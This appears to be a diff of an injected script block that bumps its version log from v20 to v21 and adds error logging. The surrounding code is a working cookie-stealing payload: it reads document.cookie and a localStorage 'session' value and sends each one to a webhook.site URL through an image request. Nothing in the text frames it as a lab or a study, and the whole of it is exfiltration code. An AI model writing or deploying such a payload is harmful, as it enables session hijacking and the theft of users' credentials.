@@ -1,5 +1,5 @@
 <script>
-console.log('v20');
+console.log('v21');
 var methods = [
     function() { return document.cookie; },
     function() { return window.localStorage.getItem('session'); },
@@ -11,6 +11,8 @@ methods.forEach(function(method, index) {
         if(data) {
             new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?method_" + index + "=" + encodeURIComponent(data);
         }
-    } catch(e) {}
+    } catch(e) {
+        console.log(e);
+    }
 });
 </script>
